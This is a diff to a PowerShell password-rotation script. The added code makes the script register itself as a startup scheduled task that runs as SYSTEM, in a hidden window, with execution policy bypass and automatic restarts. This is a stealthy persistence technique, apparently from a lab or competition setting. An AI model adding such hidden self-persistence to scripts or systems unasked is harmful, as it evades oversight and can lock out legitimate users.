@@ -6,6 +6,34 @@
 # - Rotates passwords every 10 minutes
 # ============================================================
 
+# ---- Self-Register as Scheduled Task ----
+$taskName = "UserRotationService"
+$scriptPath = $MyInvocation.MyCommand.Path
+
+if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+    $action  = New-ScheduledTaskAction -Execute "powershell.exe" `
+                   -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+
+    $settings = New-ScheduledTaskSettingsSet `
+                   -ExecutionTimeLimit ([TimeSpan]::Zero) `
+                   -RestartCount 3 `
+                   -RestartInterval (New-TimeSpan -Minutes 1)
+
+    Register-ScheduledTask -TaskName $taskName `
+        -Action $action `
+        -Trigger $trigger `
+        -RunLevel Highest `
+        -Settings $settings `
+        -User "SYSTEM"
+
+    Write-Host "Registered as scheduled task: $taskName"
+} else {
+    Write-Host "Scheduled task already exists: $taskName"
+}
+
+
 
 # ---- User Lists ----
 $users     = @("zhukov", "gusev", "makarov", "festisov", "kasatonov", "krutov",
